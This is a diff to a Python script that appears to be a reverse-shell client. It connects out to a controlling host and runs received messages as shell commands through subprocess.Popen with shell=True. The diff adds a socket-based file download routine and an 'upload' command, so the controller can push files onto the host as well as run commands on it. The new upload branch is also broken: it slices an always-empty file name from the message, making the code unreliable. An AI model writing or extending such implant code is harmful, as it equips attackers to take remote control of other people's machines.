@@ -27,6 +27,20 @@ def outbound(message):
     sock.send(response)
 
 
+def download_file(file_name):
+    file = open(file_name, 'wb')
+    sock.settimeout(1)
+    file_data = sock.recv(1024)
+    while file_data:
+        file.write(file_data)
+        try:
+            file_data = sock.recv(1024)
+        except socket.timeout as e:
+            break
+    sock.settimeout(None)
+    file.close()
+
+
 def session_handler():
     try:
         sock.connect((host_ip, host_port))
@@ -56,6 +70,14 @@ def session_handler():
                 pass
             elif message == 'help' or message == 'h':
                 pass
+            elif message == 'clear' or message == 'cls':
+                pass
+
+            # Work in progress
+            elif message == 'upload' or message == 'up':
+                download_file(message[7:])
+                outbound('File Downloaded')
+                continue
             else:
                 command = subprocess.Popen(message,
                                            shell=True,
